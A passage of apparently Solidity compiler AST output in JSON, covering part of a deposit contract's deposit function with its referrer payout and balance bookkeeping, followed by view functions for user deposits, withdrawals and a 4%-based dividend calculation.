                                          "isLValue": false,
                                          "isPure": false,
                                          "lValueRequested": false,
                                          "member_name": "sender",
                                          "referencedDeclaration": null,
                                          "type": "address"
                                        },
                                        "children": [
                                          {
                                            "attributes": {
                                              "argumentTypes": null,
                                              "overloadedDeclarations": [
                                                null
                                              ],
                                              "referencedDeclaration": 359,
                                              "type": "msg",
                                              "value": "msg"
                                            },
                                            "id": 200,
                                            "name": "Identifier",
                                            "src": "1421:3:0"
                                          }
                                        ],
                                        "id": 201,
                                        "name": "MemberAccess",
                                        "src": "1421:10:0"
                                      }
                                    ],
                                    "id": 202,
                                    "name": "IndexAccess",
                                    "src": "1412:20:0"
                                  },
                                  {
                                    "attributes": {
                                      "argumentTypes": null,
                                      "overloadedDeclarations": [
                                        null
                                      ],
                                      "referencedDeclaration": 169,
                                      "type": "uint256",
                                      "value": "depositsPercents"
                                    },
                                    "id": 203,
                                    "name": "Identifier",
                                    "src": "1436:16:0"
                                  }
                                ],
                                "id": 204,
                                "name": "Assignment",
                                "src": "1412:40:0"
                              }
                            ],
                            "id": 205,
                            "name": "ExpressionStatement",
                            "src": "1412:40:0"
                          },
                          {
                            "children": [
                              {
                                "attributes": {
                                  "argumentTypes": null,
                                  "isConstant": false,
                                  "isLValue": false,
                                  "isPure": false,
                                  "lValueRequested": false,
                                  "operator": "=",
                                  "type": "uint256"
                                },
                                "children": [
                                  {
                                    "attributes": {
                                      "argumentTypes": null,
                                      "overloadedDeclarations": [
                                        null
                                      ],
                                      "referencedDeclaration": 29,
                                      "type": "uint256",
                                      "value": "totalWithdrewWei"
                                    },
                                    "id": 206,
                                    "name": "Identifier",
                                    "src": "1457:16:0"
                                  },
                                  {
                                    "attributes": {
                                      "argumentTypes": null,
                                      "isConstant": false,
                                      "isLValue": false,
                                      "isPure": false,
                                      "isStructConstructorCall": false,
                                      "lValueRequested": false,
                                      "names": [
                                        null
                                      ],
                                      "type": "uint256",
                                      "type_conversion": false
                                    },
                                    "children": [
                                      {
                                        "attributes": {
                                          "argumentTypes": [
                                            {
                                              "typeIdentifier": "t_uint256",
                                              "typeString": "uint256"
                                            },
                                            {
                                              "typeIdentifier": "t_uint256",
                                              "typeString": "uint256"
                                            }
                                          ],
                                          "overloadedDeclarations": [
                                            null
                                          ],
                                          "referencedDeclaration": 120,
                                          "type": "function (uint256,uint256) pure returns (uint256)",
                                          "value": "add"
                                        },
                                        "id": 207,
                                        "name": "Identifier",
                                        "src": "1476:3:0"
                                      },
                                      {
                                        "attributes": {
                                          "argumentTypes": null,
                                          "overloadedDeclarations": [
                                            null
                                          ],
                                          "referencedDeclaration": 29,
                                          "type": "uint256",
                                          "value": "totalWithdrewWei"
                                        },
                                        "id": 208,
                                        "name": "Identifier",
                                        "src": "1480:16:0"
                                      },
                                      {
                                        "attributes": {
                                          "argumentTypes": null,
                                          "overloadedDeclarations": [
                                            null
                                          ],
                                          "referencedDeclaration": 169,
                                          "type": "uint256",
                                          "value": "depositsPercents"
                                        },
                                        "id": 209,
                                        "name": "Identifier",
                                        "src": "1497:16:0"
                                      }
                                    ],
                                    "id": 210,
                                    "name": "FunctionCall",
                                    "src": "1476:38:0"
                                  }
                                ],
                                "id": 211,
                                "name": "Assignment",
                                "src": "1457:57:0"
                              }
                            ],
                            "id": 212,
                            "name": "ExpressionStatement",
                            "src": "1457:57:0"
                          }
                        ],
                        "id": 213,
                        "name": "Block",
                        "src": "1213:306:0"
                      }
                    ],
                    "id": 214,
                    "name": "IfStatement",
                    "src": "1181:338:0"
                  },
                  {
                    "attributes": {
                      "assignments": [
                        216
                      ]
                    },
                    "children": [
                      {
                        "attributes": {
                          "constant": false,
                          "name": "referrer",
                          "scope": 269,
                          "stateVariable": false,
                          "storageLocation": "default",
                          "type": "address",
                          "value": null,
                          "visibility": "internal"
                        },
                        "children": [
                          {
                            "attributes": {
                              "name": "address",
                              "type": "address"
                            },
                            "id": 215,
                            "name": "ElementaryTypeName",
                            "src": "1523:7:0"
                          }
                        ],
                        "id": 216,
                        "name": "VariableDeclaration",
                        "src": "1523:16:0"
                      },
                      {
                        "attributes": {
                          "argumentTypes": null,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "isStructConstructorCall": false,
                          "lValueRequested": false,
                          "names": [
                            null
                          ],
                          "type": "address",
                          "type_conversion": false
                        },
                        "children": [
                          {
                            "attributes": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_bytes_calldata_ptr",
                                  "typeString": "bytes calldata"
                                }
                              ],
                              "overloadedDeclarations": [
                                null
                              ],
                              "referencedDeclaration": 343,
                              "type": "function (bytes memory) pure returns (address)",
                              "value": "bytesToAddress"
                            },
                            "id": 217,
                            "name": "Identifier",
                            "src": "1542:14:0"
                          },
                          {
                            "attributes": {
                              "argumentTypes": null,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": false,
                              "lValueRequested": false,
                              "member_name": "data",
                              "referencedDeclaration": null,
                              "type": "bytes calldata"
                            },
                            "children": [
                              {
                                "attributes": {
                                  "argumentTypes": null,
                                  "overloadedDeclarations": [
                                    null
                                  ],
                                  "referencedDeclaration": 359,
                                  "type": "msg",
                                  "value": "msg"
                                },
                                "id": 218,
                                "name": "Identifier",
                                "src": "1557:3:0"
                              }
                            ],
                            "id": 219,
                            "name": "MemberAccess",
                            "src": "1557:8:0"
                          }
                        ],
                        "id": 220,
                        "name": "FunctionCall",
                        "src": "1542:24:0"
                      }
                    ],
                    "id": 221,
                    "name": "VariableDeclarationStatement",
                    "src": "1523:43:0"
                  },
                  {
                    "attributes": {
                      "falseBody": null
                    },
                    "children": [
                      {
                        "attributes": {
                          "argumentTypes": null,
                          "commonType": {
                            "typeIdentifier": "t_bool",
                            "typeString": "bool"
                          },
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "operator": "&&",
                          "type": "bool"
                        },
                        "children": [
                          {
                            "attributes": {
                              "argumentTypes": null,
                              "commonType": {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              },
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": false,
                              "lValueRequested": false,
                              "operator": ">",
                              "type": "bool"
                            },
                            "children": [
                              {
                                "attributes": {
                                  "argumentTypes": null,
                                  "overloadedDeclarations": [
                                    null
                                  ],
                                  "referencedDeclaration": 216,
                                  "type": "address",
                                  "value": "referrer"
                                },
                                "id": 222,
                                "name": "Identifier",
                                "src": "1574:8:0"
                              },
                              {
                                "attributes": {
                                  "argumentTypes": null,
                                  "hexvalue": "307830",
                                  "isConstant": false,
                                  "isLValue": false,
                                  "isPure": true,
                                  "lValueRequested": false,
                                  "subdenomination": null,
                                  "token": "number",
                                  "type": "int_const 0",
                                  "value": "0x0"
                                },
                                "id": 223,
                                "name": "Literal",
                                "src": "1585:3:0"
                              }
                            ],
                            "id": 224,
                            "name": "BinaryOperation",
                            "src": "1574:14:0"
                          },
                          {
                            "attributes": {
                              "argumentTypes": null,
                              "commonType": {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              },
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": false,
                              "lValueRequested": false,
                              "operator": "!=",
                              "type": "bool"
                            },
                            "children": [
                              {
                                "attributes": {
                                  "argumentTypes": null,
                                  "overloadedDeclarations": [
                                    null
                                  ],
                                  "referencedDeclaration": 216,
                                  "type": "address",
                                  "value": "referrer"
                                },
                                "id": 225,
                                "name": "Identifier",
                                "src": "1592:8:0"
                              },
                              {
                                "attributes": {
                                  "argumentTypes": null,
                                  "isConstant": false,
                                  "isLValue": false,
                                  "isPure": false,
                                  "lValueRequested": false,
                                  "member_name": "sender",
                                  "referencedDeclaration": null,
                                  "type": "address"
                                },
                                "children": [
                                  {
                                    "attributes": {
                                      "argumentTypes": null,
                                      "overloadedDeclarations": [
                                        null
                                      ],
                                      "referencedDeclaration": 359,
                                      "type": "msg",
                                      "value": "msg"
                                    },
                                    "id": 226,
                                    "name": "Identifier",
                                    "src": "1604:3:0"
                                  }
                                ],
                                "id": 227,
                                "name": "MemberAccess",
                                "src": "1604:10:0"
                              }
                            ],
                            "id": 228,
                            "name": "BinaryOperation",
                            "src": "1592:22:0"
                          }
                        ],
                        "id": 229,
                        "name": "BinaryOperation",
                        "src": "1574:40:0"
                      },
                      {
                        "children": [
                          {
                            "children": [
                              {
                                "attributes": {
                                  "argumentTypes": null,
                                  "isConstant": false,
                                  "isLValue": false,
                                  "isPure": false,
                                  "isStructConstructorCall": false,
                                  "lValueRequested": false,
                                  "names": [
                                    null
                                  ],
                                  "type": "tuple()",
                                  "type_conversion": false
                                },
                                "children": [
                                  {
                                    "attributes": {
                                      "argumentTypes": [
                                        {
                                          "typeIdentifier": "t_uint256",
                                          "typeString": "uint256"
                                        }
                                      ],
                                      "isConstant": false,
                                      "isLValue": false,
                                      "isPure": false,
                                      "lValueRequested": false,
                                      "member_name": "transfer",
                                      "referencedDeclaration": null,
                                      "type": "function (uint256)"
                                    },
                                    "children": [
                                      {
                                        "attributes": {
                                          "argumentTypes": null,
                                          "overloadedDeclarations": [
                                            null
                                          ],
                                          "referencedDeclaration": 216,
                                          "type": "address",
                                          "value": "referrer"
                                        },
                                        "id": 230,
                                        "name": "Identifier",
                                        "src": "1621:8:0"
                                      }
                                    ],
                                    "id": 232,
                                    "name": "MemberAccess",
                                    "src": "1621:17:0"
                                  },
                                  {
                                    "attributes": {
                                      "argumentTypes": null,
                                      "overloadedDeclarations": [
                                        null
                                      ],
                                      "referencedDeclaration": 124,
                                      "type": "uint256",
                                      "value": "admRefPerc"
                                    },
                                    "id": 233,
                                    "name": "Identifier",
                                    "src": "1639:10:0"
                                  }
                                ],
                                "id": 234,
                                "name": "FunctionCall",
                                "src": "1621:29:0"
                              }
                            ],
                            "id": 235,
                            "name": "ExpressionStatement",
                            "src": "1621:29:0"
                          },
                          {
                            "children": [
                              {
                                "attributes": {
                                  "argumentTypes": null,
                                  "isConstant": false,
                                  "isLValue": false,
                                  "isPure": false,
                                  "lValueRequested": false,
                                  "operator": "+=",
                                  "type": "uint256"
                                },
                                "children": [
                                  {
                                    "attributes": {
                                      "argumentTypes": null,
                                      "isConstant": false,
                                      "isLValue": true,
                                      "isPure": false,
                                      "lValueRequested": true,
                                      "type": "uint256"
                                    },
                                    "children": [
                                      {
                                        "attributes": {
                                          "argumentTypes": null,
                                          "overloadedDeclarations": [
                                            null
                                          ],
                                          "referencedDeclaration": 19,
                                          "type": "mapping(address => uint256)",
                                          "value": "refearned"
                                        },
                                        "id": 236,
                                        "name": "Identifier",
                                        "src": "1656:9:0"
                                      },
                                      {
                                        "attributes": {
                                          "argumentTypes": null,
                                          "overloadedDeclarations": [
                                            null
                                          ],
                                          "referencedDeclaration": 216,
                                          "type": "address",
                                          "value": "referrer"
                                        },
                                        "id": 237,
                                        "name": "Identifier",
                                        "src": "1666:8:0"
                                      }
                                    ],
                                    "id": 238,
                                    "name": "IndexAccess",
                                    "src": "1656:19:0"
                                  },
                                  {
                                    "attributes": {
                                      "argumentTypes": null,
                                      "overloadedDeclarations": [
                                        null
                                      ],
                                      "referencedDeclaration": 124,
                                      "type": "uint256",
                                      "value": "admRefPerc"
                                    },
                                    "id": 239,
                                    "name": "Identifier",
                                    "src": "1679:10:0"
                                  }
                                ],
                                "id": 240,
                                "name": "Assignment",
                                "src": "1656:33:0"
                              }
                            ],
                            "id": 241,
                            "name": "ExpressionStatement",
                            "src": "1656:33:0"
                          }
                        ],
                        "id": 242,
                        "name": "Block",
                        "src": "1616:78:0"
                      }
                    ],
                    "id": 243,
                    "name": "IfStatement",
                    "src": "1570:124:0"
                  },
                  {
                    "children": [
                      {
                        "attributes": {
                          "argumentTypes": null,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "operator": "=",
                          "type": "uint256"
                        },
                        "children": [
                          {
                            "attributes": {
                              "argumentTypes": null,
                              "isConstant": false,
                              "isLValue": true,
                              "isPure": false,
                              "lValueRequested": true,
                              "type": "uint256"
                            },
                            "children": [
                              {
                                "attributes": {
                                  "argumentTypes": null,
                                  "overloadedDeclarations": [
                                    null
                                  ],
                                  "referencedDeclaration": 23,
                                  "type": "mapping(address => uint256)",
                                  "value": "blocklock"
                                },
                                "id": 244,
                                "name": "Identifier",
                                "src": "1698:9:0"
                              },
                              {
                                "attributes": {
                                  "argumentTypes": null,
                                  "isConstant": false,
                                  "isLValue": false,
                                  "isPure": false,
                                  "lValueRequested": false,
                                  "member_name": "sender",
                                  "referencedDeclaration": null,
                                  "type": "address"
                                },
                                "children": [
                                  {
                                    "attributes": {
                                      "argumentTypes": null,
                                      "overloadedDeclarations": [
                                        null
                                      ],
                                      "referencedDeclaration": 359,
                                      "type": "msg",
                                      "value": "msg"
                                    },
                                    "id": 245,
                                    "name": "Identifier",
                                    "src": "1708:3:0"
                                  }
                                ],
                                "id": 246,
                                "name": "MemberAccess",
                                "src": "1708:10:0"
                              }
                            ],
                            "id": 247,
                            "name": "IndexAccess",
                            "src": "1698:21:0"
                          },
                          {
                            "attributes": {
                              "argumentTypes": null,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": false,
                              "lValueRequested": false,
                              "member_name": "number",
                              "referencedDeclaration": null,
                              "type": "uint256"
                            },
                            "children": [
                              {
                                "attributes": {
                                  "argumentTypes": null,
                                  "overloadedDeclarations": [
                                    null
                                  ],
                                  "referencedDeclaration": 349,
                                  "type": "block",
                                  "value": "block"
                                },
                                "id": 248,
                                "name": "Identifier",
                                "src": "1722:5:0"
                              }
                            ],
                            "id": 249,
                            "name": "MemberAccess",
                            "src": "1722:12:0"
                          }
                        ],
                        "id": 250,
                        "name": "Assignment",
                        "src": "1698:36:0"
                      }
                    ],
                    "id": 251,
                    "name": "ExpressionStatement",
                    "src": "1698:36:0"
                  },
                  {
                    "children": [
                      {
                        "attributes": {
                          "argumentTypes": null,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "operator": "+=",
                          "type": "uint256"
                        },
                        "children": [
                          {
                            "attributes": {
                              "argumentTypes": null,
                              "isConstant": false,
                              "isLValue": true,
                              "isPure": false,
                              "lValueRequested": true,
                              "type": "uint256"
                            },
                            "children": [
                              {
                                "attributes": {
                                  "argumentTypes": null,
                                  "overloadedDeclarations": [
                                    null
                                  ],
                                  "referencedDeclaration": 11,
                                  "type": "mapping(address => uint256)",
                                  "value": "deposited"
                                },
                                "id": 252,
                                "name": "Identifier",
                                "src": "1738:9:0"
                              },
                              {
                                "attributes": {
                                  "argumentTypes": null,
                                  "isConstant": false,
                                  "isLValue": false,
                                  "isPure": false,
                                  "lValueRequested": false,
                                  "member_name": "sender",
                                  "referencedDeclaration": null,
                                  "type": "address"
                                },
                                "children": [
                                  {
                                    "attributes": {
                                      "argumentTypes": null,
                                      "overloadedDeclarations": [
                                        null
                                      ],
                                      "referencedDeclaration": 359,
                                      "type": "msg",
                                      "value": "msg"
                                    },
                                    "id": 253,
                                    "name": "Identifier",
                                    "src": "1748:3:0"
                                  }
                                ],
                                "id": 254,
                                "name": "MemberAccess",
                                "src": "1748:10:0"
                              }
                            ],
                            "id": 255,
                            "name": "IndexAccess",
                            "src": "1738:21:0"
                          },
                          {
                            "attributes": {
                              "argumentTypes": null,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": false,
                              "lValueRequested": false,
                              "member_name": "value",
                              "referencedDeclaration": null,
                              "type": "uint256"
                            },
                            "children": [
                              {
                                "attributes": {
                                  "argumentTypes": null,
                                  "overloadedDeclarations": [
                                    null
                                  ],
                                  "referencedDeclaration": 359,
                                  "type": "msg",
                                  "value": "msg"
                                },
                                "id": 256,
                                "name": "Identifier",
                                "src": "1763:3:0"
                              }
                            ],
                            "id": 257,
                            "name": "MemberAccess",
                            "src": "1763:9:0"
                          }
                        ],
                        "id": 258,
                        "name": "Assignment",
                        "src": "1738:34:0"
                      }
                    ],
                    "id": 259,
                    "name": "ExpressionStatement",
                    "src": "1738:34:0"
                  },
                  {
                    "children": [
                      {
                        "attributes": {
                          "argumentTypes": null,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "operator": "=",
                          "type": "uint256"
                        },
                        "children": [
                          {
                            "attributes": {
                              "argumentTypes": null,
                              "overloadedDeclarations": [
                                null
                              ],
                              "referencedDeclaration": 26,
                              "type": "uint256",
                              "value": "totalDepositedWei"
                            },
                            "id": 260,
                            "name": "Identifier",
                            "src": "1777:17:0"
                          },
                          {
                            "attributes": {
                              "argumentTypes": null,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": false,
                              "isStructConstructorCall": false,
                              "lValueRequested": false,
                              "names": [
                                null
                              ],
                              "type": "uint256",
                              "type_conversion": false
                            },
                            "children": [
                              {
                                "attributes": {
                                  "argumentTypes": [
                                    {
                                      "typeIdentifier": "t_uint256",
                                      "typeString": "uint256"
                                    },
                                    {
                                      "typeIdentifier": "t_uint256",
                                      "typeString": "uint256"
                                    }
                                  ],
                                  "overloadedDeclarations": [
                                    null
                                  ],
                                  "referencedDeclaration": 120,
                                  "type": "function (uint256,uint256) pure returns (uint256)",
                                  "value": "add"
                                },
                                "id": 261,
                                "name": "Identifier",
                                "src": "1797:3:0"
                              },
                              {
                                "attributes": {
                                  "argumentTypes": null,
                                  "overloadedDeclarations": [
                                    null
                                  ],
                                  "referencedDeclaration": 26,
                                  "type": "uint256",
                                  "value": "totalDepositedWei"
                                },
                                "id": 262,
                                "name": "Identifier",
                                "src": "1801:17:0"
                              },
                              {
                                "attributes": {
                                  "argumentTypes": null,
                                  "isConstant": false,
                                  "isLValue": false,
                                  "isPure": false,
                                  "lValueRequested": false,
                                  "member_name": "value",
                                  "referencedDeclaration": null,
                                  "type": "uint256"
                                },
                                "children": [
                                  {
                                    "attributes": {
                                      "argumentTypes": null,
                                      "overloadedDeclarations": [
                                        null
                                      ],
                                      "referencedDeclaration": 359,
                                      "type": "msg",
                                      "value": "msg"
                                    },
                                    "id": 263,
                                    "name": "Identifier",
                                    "src": "1819:3:0"
                                  }
                                ],
                                "id": 264,
                                "name": "MemberAccess",
                                "src": "1819:9:0"
                              }
                            ],
                            "id": 265,
                            "name": "FunctionCall",
                            "src": "1797:32:0"
                          }
                        ],
                        "id": 266,
                        "name": "Assignment",
                        "src": "1777:52:0"
                      }
                    ],
                    "id": 267,
                    "name": "ExpressionStatement",
                    "src": "1777:52:0"
                  }
                ],
                "id": 268,
                "name": "Block",
                "src": "1010:823:0"
              }
            ],
            "id": 269,
            "name": "FunctionDefinition",
            "src": "982:851:0"
          },
          {
            "attributes": {
              "constant": true,
              "documentation": null,
              "implemented": true,
              "isConstructor": false,
              "modifiers": [
                null
              ],
              "name": "userDepositedWei",
              "payable": false,
              "scope": 344,
              "stateMutability": "view",
              "superFunction": null,
              "visibility": "public"
            },
            "children": [
              {
                "children": [
                  {
                    "attributes": {
                      "constant": false,
                      "name": "_address",
                      "scope": 281,
                      "stateVariable": false,
                      "storageLocation": "default",
                      "type": "address",
                      "value": null,
                      "visibility": "internal"
                    },
                    "children": [
                      {
                        "attributes": {
                          "name": "address",
                          "type": "address"
                        },
                        "id": 270,
                        "name": "ElementaryTypeName",
                        "src": "1862:7:0"
                      }
                    ],
                    "id": 271,
                    "name": "VariableDeclaration",
                    "src": "1862:16:0"
                  }
                ],
                "id": 272,
                "name": "ParameterList",
                "src": "1861:18:0"
              },
              {
                "children": [
                  {
                    "attributes": {
                      "constant": false,
                      "name": "",
                      "scope": 281,
                      "stateVariable": false,
                      "storageLocation": "default",
                      "type": "uint256",
                      "value": null,
                      "visibility": "internal"
                    },
                    "children": [
                      {
                        "attributes": {
                          "name": "uint256",
                          "type": "uint256"
                        },
                        "id": 273,
                        "name": "ElementaryTypeName",
                        "src": "1901:7:0"
                      }
                    ],
                    "id": 274,
                    "name": "VariableDeclaration",
                    "src": "1901:7:0"
                  }
                ],
                "id": 275,
                "name": "ParameterList",
                "src": "1900:9:0"
              },
              {
                "children": [
                  {
                    "attributes": {
                      "functionReturnParameters": 275
                    },
                    "children": [
                      {
                        "attributes": {
                          "argumentTypes": null,
                          "isConstant": false,
                          "isLValue": true,
                          "isPure": false,
                          "lValueRequested": false,
                          "type": "uint256"
                        },
                        "children": [
                          {
                            "attributes": {
                              "argumentTypes": null,
                              "overloadedDeclarations": [
                                null
                              ],
                              "referencedDeclaration": 11,
                              "type": "mapping(address => uint256)",
                              "value": "deposited"
                            },
                            "id": 276,
                            "name": "Identifier",
                            "src": "1921:9:0"
                          },
                          {
                            "attributes": {
                              "argumentTypes": null,
                              "overloadedDeclarations": [
                                null
                              ],
                              "referencedDeclaration": 271,
                              "type": "address",
                              "value": "_address"
                            },
                            "id": 277,
                            "name": "Identifier",
                            "src": "1931:8:0"
                          }
                        ],
                        "id": 278,
                        "name": "IndexAccess",
                        "src": "1921:19:0"
                      }
                    ],
                    "id": 279,
                    "name": "Return",
                    "src": "1914:26:0"
                  }
                ],
                "id": 280,
                "name": "Block",
                "src": "1910:37:0"
              }
            ],
            "id": 281,
            "name": "FunctionDefinition",
            "src": "1836:111:0"
          },
          {
            "attributes": {
              "constant": true,
              "documentation": null,
              "implemented": true,
              "isConstructor": false,
              "modifiers": [
                null
              ],
              "name": "userWithdrewWei",
              "payable": false,
              "scope": 344,
              "stateMutability": "view",
              "superFunction": null,
              "visibility": "public"
            },
            "children": [
              {
                "children": [
                  {
                    "attributes": {
                      "constant": false,
                      "name": "_address",
                      "scope": 293,
                      "stateVariable": false,
                      "storageLocation": "default",
                      "type": "address",
                      "value": null,
                      "visibility": "internal"
                    },
                    "children": [
                      {
                        "attributes": {
                          "name": "address",
                          "type": "address"
                        },
                        "id": 282,
                        "name": "ElementaryTypeName",
                        "src": "1975:7:0"
                      }
                    ],
                    "id": 283,
                    "name": "VariableDeclaration",
                    "src": "1975:16:0"
                  }
                ],
                "id": 284,
                "name": "ParameterList",
                "src": "1974:18:0"
              },
              {
                "children": [
                  {
                    "attributes": {
                      "constant": false,
                      "name": "",
                      "scope": 293,
                      "stateVariable": false,
                      "storageLocation": "default",
                      "type": "uint256",
                      "value": null,
                      "visibility": "internal"
                    },
                    "children": [
                      {
                        "attributes": {
                          "name": "uint256",
                          "type": "uint256"
                        },
                        "id": 285,
                        "name": "ElementaryTypeName",
                        "src": "2014:7:0"
                      }
                    ],
                    "id": 286,
                    "name": "VariableDeclaration",
                    "src": "2014:7:0"
                  }
                ],
                "id": 287,
                "name": "ParameterList",
                "src": "2013:9:0"
              },
              {
                "children": [
                  {
                    "attributes": {
                      "functionReturnParameters": 287
                    },
                    "children": [
                      {
                        "attributes": {
                          "argumentTypes": null,
                          "isConstant": false,
                          "isLValue": true,
                          "isPure": false,
                          "lValueRequested": false,
                          "type": "uint256"
                        },
                        "children": [
                          {
                            "attributes": {
                              "argumentTypes": null,
                              "overloadedDeclarations": [
                                null
                              ],
                              "referencedDeclaration": 15,
                              "type": "mapping(address => uint256)",
                              "value": "withdrew"
                            },
                            "id": 288,
                            "name": "Identifier",
                            "src": "2034:8:0"
                          },
                          {
                            "attributes": {
                              "argumentTypes": null,
                              "overloadedDeclarations": [
                                null
                              ],
                              "referencedDeclaration": 283,
                              "type": "address",
                              "value": "_address"
                            },
                            "id": 289,
                            "name": "Identifier",
                            "src": "2043:8:0"
                          }
                        ],
                        "id": 290,
                        "name": "IndexAccess",
                        "src": "2034:18:0"
                      }
                    ],
                    "id": 291,
                    "name": "Return",
                    "src": "2027:25:0"
                  }
                ],
                "id": 292,
                "name": "Block",
                "src": "2023:36:0"
              }
            ],
            "id": 293,
            "name": "FunctionDefinition",
            "src": "1950:109:0"
          },
          {
            "attributes": {
              "constant": true,
              "documentation": null,
              "implemented": true,
              "isConstructor": false,
              "modifiers": [
                null
              ],
              "name": "userDividendsWei",
              "payable": false,
              "scope": 344,
              "stateMutability": "view",
              "superFunction": null,
              "visibility": "public"
            },
            "children": [
              {
                "children": [
                  {
                    "attributes": {
                      "constant": false,
                      "name": "_address",
                      "scope": 322,
                      "stateVariable": false,
                      "storageLocation": "default",
                      "type": "address",
                      "value": null,
                      "visibility": "internal"
                    },
                    "children": [
                      {
                        "attributes": {
                          "name": "address",
                          "type": "address"
                        },
                        "id": 294,
                        "name": "ElementaryTypeName",
                        "src": "2088:7:0"
                      }
                    ],
                    "id": 295,
                    "name": "VariableDeclaration",
                    "src": "2088:16:0"
                  }
                ],
                "id": 296,
                "name": "ParameterList",
                "src": "2087:18:0"
              },
              {
                "children": [
                  {
                    "attributes": {
                      "constant": false,
                      "name": "",
                      "scope": 322,
                      "stateVariable": false,
                      "storageLocation": "default",
                      "type": "uint256",
                      "value": null,
                      "visibility": "internal"
                    },
                    "children": [
                      {
                        "attributes": {
                          "name": "uint256",
                          "type": "uint256"
                        },
                        "id": 297,
                        "name": "ElementaryTypeName",
                        "src": "2127:7:0"
                      }
                    ],
                    "id": 298,
                    "name": "VariableDeclaration",
                    "src": "2127:7:0"
                  }
                ],
                "id": 299,
                "name": "ParameterList",
                "src": "2126:9:0"
              },
              {
                "children": [
                  {
                    "attributes": {
                      "functionReturnParameters": 299
                    },
                    "children": [
                      {
                        "attributes": {
                          "argumentTypes": null,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "isStructConstructorCall": false,
                          "lValueRequested": false,
                          "names": [
                            null
                          ],
                          "type": "uint256",
                          "type_conversion": false
                        },
                        "children": [
                          {
                            "attributes": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_uint256",
                                  "typeString": "uint256"
                                },
                                {
                                  "typeIdentifier": "t_rational_5900_by_1",
                                  "typeString": "int_const 5900"
                                }
                              ],
                              "overloadedDeclarations": [
                                null
                              ],
                              "referencedDeclaration": 76,
                              "type": "function (uint256,uint256) pure returns (uint256)",
                              "value": "div"
                            },
                            "id": 300,
                            "name": "Identifier",
                            "src": "2147:3:0"
                          },
                          {
                            "attributes": {
                              "argumentTypes": null,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": false,
                              "isStructConstructorCall": false,
                              "lValueRequested": false,
                              "names": [
                                null
                              ],
                              "type": "uint256",
                              "type_conversion": false
                            },
                            "children": [
                              {
                                "attributes": {
                                  "argumentTypes": [
                                    {
                                      "typeIdentifier": "t_uint256",
                                      "typeString": "uint256"
                                    },
                                    {
                                      "typeIdentifier": "t_uint256",
                                      "typeString": "uint256"
                                    }
                                  ],
                                  "overloadedDeclarations": [
                                    null
                                  ],
                                  "referencedDeclaration": 62,
                                  "type": "function (uint256,uint256) pure returns (uint256)",
                                  "value": "mul"
                                },
                                "id": 301,
                                "name": "Identifier",
                                "src": "2151:3:0"
                              },
                              {
                                "attributes": {
                                  "argumentTypes": null,
                                  "isConstant": false,
                                  "isLValue": false,
                                  "isPure": false,
                                  "isStructConstructorCall": false,
                                  "lValueRequested": false,
                                  "names": [
                                    null
                                  ],
                                  "type": "uint256",
                                  "type_conversion": false
                                },
                                "children": [
                                  {
                                    "attributes": {
                                      "argumentTypes": [
                                        {
                                          "typeIdentifier": "t_uint256",
                                          "typeString": "uint256"
                                        },
                                        {
                                          "typeIdentifier": "t_rational_100_by_1",
                                          "typeString": "int_const 100"
                                        }
                                      ],
                                      "overloadedDeclarations": [
                                        null
                                      ],
                                      "referencedDeclaration": 76,
                                      "type": "function (uint256,uint256) pure returns (uint256)",
                                      "value": "div"
                                    },
                                    "id": 302,
                                    "name": "Identifier",
                                    "src": "2155:3:0"
                                  },
                                  {
                                    "attributes": {
                                      "argumentTypes": null,
                                      "isConstant": false,
                                      "isLValue": false,
                                      "isPure": false,
                                      "isStructConstructorCall": false,
                                      "lValueRequested": false,
                                      "names": [
                                        null
                                      ],
                                      "type": "uint256",
                                      "type_conversion": false
                                    },
                                    "children": [
                                      {
                                        "attributes": {
                                          "argumentTypes": [
                                            {
                                              "typeIdentifier": "t_uint256",
                                              "typeString": "uint256"
                                            },
                                            {
                                              "typeIdentifier": "t_rational_4_by_1",
                                              "typeString": "int_const 4"
                                            }
                                          ],
                                          "overloadedDeclarations": [
                                            null
                                          ],
                                          "referencedDeclaration": 62,
                                          "type": "function (uint256,uint256) pure returns (uint256)",
                                          "value": "mul"
                                        },
                                        "id": 303,
                                        "name": "Identifier",
                                        "src": "2159:3:0"
                                      },
                                      {
                                        "attributes": {
                                          "argumentTypes": null,
                                          "isConstant": false,
                                          "isLValue": true,
                                          "isPure": false,
                                          "lValueRequested": false,
                                          "type": "uint256"
                                        },
                                        "children": [
                                          {
                                            "attributes": {
                                              "argumentTypes": null,
                                              "overloadedDeclarations": [
                                                null
                                              ],
                                              "referencedDeclaration": 11,
                                              "type": "mapping(address => uint256)",
                                              "value": "deposited"
                                            },
                                            "id": 304,
                                            "name": "Identifier",
                                            "src": "2163:9:0"
                                          },
                                          {
                                            "attributes": {
                                              "argumentTypes": null,
                                              "overloadedDeclarations": [
                                                null
                                              ],
                                              "referencedDeclaration": 295,
                                              "type": "address",
                                              "value": "_address"
                                            },
                                            "id": 305,
                                            "name": "Identifier",
                                            "src": "2173:8:0"
                                          }
                                        ],
                                        "id": 306,
                                        "name": "IndexAccess",
                                        "src": "2163:19:0"
                                      },
                                      {
                                        "attributes": {
                                          "argumentTypes": null,
                                          "hexvalue": "34",
                                          "isConstant": false,
                                          "isLValue": false,
                                          "isPure": true,
                                          "lValueRequested": false,
                                          "subdenomination": null,
                                          "token": "number",
                                          "type": "int_const 4",
                                          "value": "4"
                                        },
                                        "id": 307,
                                        "name": "Literal",
                                        "src": "2183:1:0"
                                      }
                                    ],
                                    "id": 308,
                                    "name": "FunctionCall",
                                    "src": "2159:26:0"
                                  },
                                  {
                                    "attributes": {
                                      "argumentTypes": null,
